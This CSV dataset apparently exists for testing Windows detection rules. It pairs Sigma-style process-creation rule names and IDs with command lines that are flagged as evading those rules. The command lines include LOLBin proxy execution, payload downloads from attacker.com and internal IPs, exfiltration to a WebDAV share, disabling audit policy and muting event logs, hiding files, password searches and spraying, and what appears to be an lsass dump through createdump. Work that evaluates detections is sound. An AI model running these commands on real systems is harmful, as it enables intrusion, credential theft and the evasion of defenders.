Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1218,proc_creation_win_addinutil_uncommon_cmdline,Uncommon AddinUtil.EXE CommandLine Execution,4f2cd9b6-4a17-440f-bb2a-687abb65993a,,AddInUtil.exe -AddInRoot:C:\\Users\\Public\\Payload,TRUE,TRUE,TRUE,
t1218,proc_creation_win_addinutil_uncommon_cmdline,Uncommon AddinUtil.EXE CommandLine Execution,4f2cd9b6-4a17-440f-bb2a-687abb65993a,,AddInUtil.exe /AddInRoot:C:\\Users\\Public\\Payload,TRUE,TRUE,TRUE,
t1218,proc_creation_win_agentexecutor_potential_abuse,AgentExecutor PowerShell Execution,7efd2c8d-8b18-45b7-947d-adfe9ed04f61,,"copy powershell.exe AgentExecutor.exe && AgentExecutor.exe -Command ""Write-Output 'Bypassed'""",TRUE,TRUE,TRUE,
t1218,proc_creation_win_agentexecutor_potential_abuse,AgentExecutor PowerShell Execution,7efd2c8d-8b18-45b7-947d-adfe9ed04f61,,AgentExecutor.exe -powershell script.ps1 C:\out.txt C:\err.txt C:\timeout.txt 60000 C:\Windows\System32\WindowsPowerShell\v1.0\ 0,TRUE,TRUE,TRUE,
t1218,proc_creation_win_dotnet_trace_lolbin_execution,Binary Proxy Execution Via Dotnet-Trace.EXE,9257c05b-4a4a-48e5-a670-b7b073cf401b,,dotnet-trace collect -- calc.exe,TRUE,TRUE,TRUE,
t1218,proc_creation_win_dsacls_password_spray,Potential Password Spraying Attempt Using Dsacls.EXE,bac9fb54-2da7-44e9-988f-11e9a5edbc0c,,dsacls.exe /U:admin /P:Password123,TRUE,TRUE,TRUE,
t1218,proc_creation_win_findstr_download,Remote File Download Via Findstr.EXE,587254ee-a24b-4335-b3cd-065c0f1f4baa,,"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^| findstr /m .",TRUE,TRUE,TRUE,
t1218,proc_creation_win_findstr_subfolder_search,Insensitive Subfolder Search Via Findstr.EXE,04936b66-3915-43ad-a8e5-809eadfd1141,,"findstr /s/i ""password"" C:\*.txt",TRUE,TRUE,TRUE,
t1218,proc_creation_win_findstr_subfolder_search,Insensitive Subfolder Search Via Findstr.EXE,04936b66-3915-43ad-a8e5-809eadfd1141,,"findstr -s -i ""password"" C:\*.txt",TRUE,TRUE,TRUE,
t1218,proc_creation_win_findstr_subfolder_search,Insensitive Subfolder Search Via Findstr.EXE,04936b66-3915-43ad-a8e5-809eadfd1141,,"findstr -si ""password"" C:\*.txt",TRUE,TRUE,TRUE,
t1218,proc_creation_win_findstr_subfolder_search,Insensitive Subfolder Search Via Findstr.EXE,04936b66-3915-43ad-a8e5-809eadfd1141,,"findstr /S /I ""password"" C:\*.txt",TRUE,TRUE,TRUE,
t1218,proc_creation_win_findstr_subfolder_search,Insensitive Subfolder Search Via Findstr.EXE,04936b66-3915-43ad-a8e5-809eadfd1141,,"findstr.exe /s /i ""password"" C:\*.txt",TRUE,TRUE,TRUE,
t1218,proc_creation_win_lolbin_mpiexec,MpiExec Lolbin,729ce0ea-5d8f-4769-9762-e35de441586d,,mpiexec.exe -n1 calc.exe,TRUE,TRUE,TRUE,
t1218,proc_creation_win_lolbin_openwith,OpenWith.exe Executes Specified Binary,cec8e918-30f7-4e2d-9bfa-a59cc97ae60f,,OpenWith.exe /c calc.exe >nul 2>&1,TRUE,TRUE,TRUE,
t1218,proc_creation_win_lolbin_openwith,OpenWith.exe Executes Specified Binary,cec8e918-30f7-4e2d-9bfa-a59cc97ae60f,,OpenWith.exe /c calc.exe | findstr .,TRUE,TRUE,TRUE,
t1218,proc_creation_win_lolbin_rasautou_dll_execution,DLL Execution via Rasautou.exe,cd3d1298-eb3b-476c-ac67-12847de55813,,rasautou.exe -d test.dll -p DllMain,TRUE,TRUE,TRUE,
t1218,proc_creation_win_lolbin_syncappvpublishingserver_execute_psh,SyncAppvPublishingServer Execute Arbitrary PowerShell Code,fbd7c32d-db2a-4418-b92c-566eb8911133,,"SyncAppvPublishingServer.exe ""n;"" -ex Bypass -File script.ps1",TRUE,TRUE,TRUE,
t1218,proc_creation_win_mofcomp_execution,Potential Suspicious Mofcomp Execution,1dd05363-104e-4b4a-b963-196a534b03a1,,"Start-Process mofcomp.exe -ArgumentList ""C:\Windows\TEMP\evasion.mof""",TRUE,TRUE,TRUE,
t1218,proc_creation_win_msohtmed_download,Arbitrary File Download Via MSOHTMED.EXE,459f2f98-397b-4a4a-9f47-6a5ec2f1c69d,,"msohtmed.exe ""h""tt""p""://attacker.com/payload.exe",TRUE,TRUE,TRUE,
t1218,proc_creation_win_msohtmed_download,Arbitrary File Download Via MSOHTMED.EXE,459f2f98-397b-4a4a-9f47-6a5ec2f1c69d,,msohtmed.exe payload.exe,TRUE,TRUE,TRUE,
t1218,proc_creation_win_powershell_remotefxvgpudisablement_abuse,RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses,a6fc3c46-23b8-4996-9ea2-573f4c4d88c5,,"""powershell.exe"" & {Invoke-ATHRemoteFXvGPUDisableme -ModuleName foo -ModulePath $PWD}",TRUE,TRUE,TRUE,
t1218,proc_creation_win_powershell_remotefxvgpudisablement_abuse,RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses,a6fc3c46-23b8-4996-9ea2-573f4c4d88c5,,"""powershell.exe"" & {Invoke-ATHRemoteFXvGPUDisablementCommand -Module foo -ModulePath $PWD}",TRUE,TRUE,TRUE,
t1218,proc_creation_win_powershell_remotefxvgpudisablement_abuse,RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses,a6fc3c46-23b8-4996-9ea2-573f4c4d88c5,,"""powershell.exe"" & {Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $env:PWD}",TRUE,TRUE,TRUE,
t1127,proc_creation_win_node_abuse,Potential Arbitrary Code Execution Via Node.EXE,6640f31c-01ad-49b5-beb5-83498a5cd8bd,,"node.exe -e ""require('child_process').exec('cmd /c echo test > C:\\Windows\\Temp\\test.txt');""",TRUE,TRUE,TRUE,
t1564.001,proc_creation_win_attrib_hiding_files,Hiding Files with Attrib.exe,4281cb20-2994-4580-aa63-c8b86d019934,,attrib.exe +h C:\Users\thaim\AppData\Local\Temp\T1222.001_attrib_2\T1222.001_attrib1.txt,TRUE,TRUE,TRUE,
t1564.001,proc_creation_win_attrib_hiding_files,Hiding Files with Attrib.exe,4281cb20-2994-4580-aa63-c8b86d019934,,attrib.exe +h C:\Users\thaim\AppData\Local\Temp\T1222.001_attrib_2\T1222.001_attrib1.txt C:\Users\thaim\AppData\Local\Temp\T1222.001_attrib_2\T1222.001_attrib2.txt,TRUE,TRUE,TRUE,
t1564.001,proc_creation_win_attrib_system_susp_paths,Set Suspicious Files as System Files Using Attrib.EXE,efec536f-72e8-4656-8960-5e85d091345b,,attrib.exe +s C:\Users\Public\malicious.txt,TRUE,TRUE,TRUE,
t1564.001,proc_creation_win_attrib_system_susp_paths,Set Suspicious Files as System Files Using Attrib.EXE,efec536f-72e8-4656-8960-5e85d091345b,,attrib.exe +sh C:\Users\AppData\Local\malicious.txt,TRUE,TRUE,TRUE,
t1564.001,proc_creation_win_attrib_system_susp_paths,Set Suspicious Files as System Files Using Attrib.EXE,efec536f-72e8-4656-8960-5e85d091345b,,copy attrib.exe not_attrib.exe && not_attrib.exe +s C:\Users\Downloads\payload.exe,TRUE,TRUE,TRUE,
t1564.001,proc_creation_win_icacls_deny,Use Icacls to Hide File to Everyone,4ae81040-fc1c-4249-bfa3-938d260214d9,,"icacls.exe ""C:\\Users\\Public\\secret"" /deny *S-1-1-0:(OI)(CI)(DE,DC) >NUL 2>&1",TRUE,TRUE,TRUE,
t1562.002,proc_creation_win_auditpol_nt_resource_kit_usage,Audit Policy Tampering Via NT Resource Kit Auditpol,c6c56ada-612b-42d1-9a29-adad3c5c2c1e,,"auditpol.exe /set /subcategory:""Logon"" /success:disable /failure:disable",TRUE,TRUE,TRUE,
t1562.002,proc_creation_win_auditpol_nt_resource_kit_usage,Audit Policy Tampering Via NT Resource Kit Auditpol,c6c56ada-612b-42d1-9a29-adad3c5c2c1e,,auditpol.exe /remove /all,TRUE,TRUE,TRUE,
t1562.002,proc_creation_win_auditpol_susp_execution,Audit Policy Tampering Via Auditpol,0a13e132-651d-11eb-ae93-0242ac130002,,auditpol.exe /set /category:Detailed_Tracking /success:disable,TRUE,TRUE,TRUE,
t1562.002,proc_creation_win_hktl_sharpevtmute,HackTool - SharpEvtMute Execution,bedfc8ad-d1c7-4e37-a20e-e2b0dbee759c,,SharpEvtMute.exe --Filter 'rule name { eventid == 4624 }',TRUE,TRUE,TRUE,
t1202,proc_creation_win_bash_command_execution,Indirect Inline Command Execution Via Bash.EXE,5edc2273-c26f-406c-83f3-f4d948e740dd,,"bash.exe -c ""whoami""",TRUE,TRUE,TRUE,
t1202,proc_creation_win_bash_command_execution,Indirect Inline Command Execution Via Bash.EXE,5edc2273-c26f-406c-83f3-f4d948e740dd,,bash.exe -c whoami,TRUE,TRUE,TRUE,
t1202,proc_creation_win_bash_command_execution,Indirect Inline Command Execution Via Bash.EXE,5edc2273-c26f-406c-83f3-f4d948e740dd,,"bash.exe -c""whoami""",TRUE,TRUE,TRUE,
t1202,proc_creation_win_conhost_legacy_option,Suspicious High IntegrityLevel Conhost Legacy Option,3037d961-21e9-4732-b27a-637bcc7bf539,,conhost.exe 0xffffffff -ForceV1,TRUE,TRUE,TRUE,
t1202,proc_creation_win_conhost_legacy_option,Suspicious High IntegrityLevel Conhost Legacy Option,3037d961-21e9-4732-b27a-637bcc7bf539,,"""conhost.exe"" 0xffffffff -ForceV1",TRUE,TRUE,TRUE,
t1202,proc_creation_win_conhost_legacy_option,Suspicious High IntegrityLevel Conhost Legacy Option,3037d961-21e9-4732-b27a-637bcc7bf539,,conhost.exe 0xFFFFFFFF -forcev1,TRUE,TRUE,TRUE,
t1048,proc_creation_win_bcp_export_data,Data Export From MSSQL Table Via BCP.EXE,c615d676-f655-46b9-b913-78729021e5d7,,"bcp ""SELECT * FROM dbo.SecretTable"" queryout C:\temp\export.txt -c -T -S MYSERVER -d MyDB",TRUE,TRUE,TRUE,
t1048,proc_creation_win_bcp_export_data,Data Export From MSSQL Table Via BCP.EXE,c615d676-f655-46b9-b913-78729021e5d7,,"bcp ""SELECT * FROM dbo.SecretTable"" queryout C:\temp\export.txt -c -T -d MyDB -S MYSERVER",TRUE,TRUE,TRUE,
t1048,proc_creation_win_bcp_export_data,Data Export From MSSQL Table Via BCP.EXE,c615d676-f655-46b9-b913-78729021e5d7,,"bcp ""SELECT * FROM dbo.SecretTable"" queryout C:\temp\export.txt -c -T -S""MYSERVER"" -d""MyDB""",TRUE,TRUE,TRUE,
t1197,proc_creation_win_bitsadmin_download,File Download Via Bitsadmin,d059842b-6b9d-4ed1-b5c3-5b89143c6ede,,"C:\Windows\System32\bitsadmin.exe"" /transfer MyJob /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt",TRUE,TRUE,TRUE,
t1105,proc_creation_win_certoc_download_direct_ip,File Download From IP Based URL Via CertOC.EXE,b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a,,certoc.exe -GetCACAPS http://192.168.1.100/payload.ext,TRUE,TRUE,TRUE,
t1105,proc_creation_win_certoc_download_direct_ip,File Download From IP Based URL Via CertOC.EXE,b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a,,certoc.exe /GetCACAPS http://192.168.1.100/payload.ext,TRUE,TRUE,TRUE,
t1105,proc_creation_win_certoc_download_direct_ip,File Download From IP Based URL Via CertOC.EXE,b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a,,"certoc.exe -GetCACAPS ""http://192.168.1.100/payload.ext""",TRUE,TRUE,TRUE,
t1105,proc_creation_win_cmd_type_arbitrary_file_download,Potential Download/Upload Activity Using Type Command,aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f,,cmd.exe /c t^y^p^e C:\temp\data.txt > \\webdav.server.local\share\data.txt,TRUE,TRUE,TRUE,
t1105,proc_creation_win_gup_download,File Download Using Notepad++ GUP Utility,44143844-0631-49ab-97a0-96387d6b2d7c,,GUP.exe -unzipTo C:\Temp h t t p : / / example.com/payload.zip,TRUE,TRUE,TRUE,
t1105,proc_creation_win_gup_download,File Download Using Notepad++ GUP Utility,44143844-0631-49ab-97a0-96387d6b2d7c,,GUP.exe -unzipTo=C:\Temp $env:url,TRUE,TRUE,TRUE,
t1036,proc_creation_win_calc_uncommon_exec,Suspicious Calculator Usage,737e618a-a410-49b5-bec3-9e55ff7fbc15,,copy calc.exe math.exe && math.exe -suspicious_flag,TRUE,TRUE,TRUE,
t1036,proc_creation_win_calc_uncommon_exec,Suspicious Calculator Usage,737e618a-a410-49b5-bec3-9e55ff7fbc15,,calc.exe,TRUE,TRUE,TRUE,
t1036,proc_creation_win_calc_uncommon_exec,Suspicious Calculator Usage,737e618a-a410-49b5-bec3-9e55ff7fbc15,,calc.exe -?,TRUE,TRUE,TRUE,
t1036,proc_creation_win_chcp_codepage_switch,Suspicious CodePage Switch Via CHCP,c7942406-33dd-4377-a564-0f62db0593a3,,chcp.com 936,TRUE,TRUE,TRUE,
t1036,proc_creation_win_createdump_lolbin_execution,CreateDump Process Dump,515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48,,"""C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.17\\createdump.exe"" --full -f C:\\Users\\thaim\\AppData\\Local\\Temp\\dotnet-lsass.dmp 788",TRUE,TRUE,TRUE,
